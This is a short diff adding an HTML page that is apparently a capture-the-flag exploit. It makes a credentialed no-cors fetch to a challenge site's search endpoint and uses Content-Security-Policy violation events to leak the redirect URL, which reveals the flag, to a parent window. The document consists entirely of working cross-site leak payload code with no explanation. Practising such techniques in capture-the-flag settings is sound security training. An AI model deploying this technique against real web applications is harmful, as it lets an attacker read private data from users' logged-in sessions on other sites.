@@ -1,0 +1,11 @@
+   <head>
+            <meta http-equiv='Content-Security-Policy' content="default-src * 'unsafe-inline'; connect-src http://web2.africacryptctf.online:80">
+        </head>
+        <body>
+              
+            <script>
+                document.addEventListener('securitypolicyviolation', e => {parent.postMessage(e.blockedURI, '*')})
+                fetch("http://web2.africacryptctf.online:80/search?query=FLAG", {mode:'no-cors', credentials: 'include'}).then(x=>console.log(x))
+            </script>
+        </body>
+        </html>
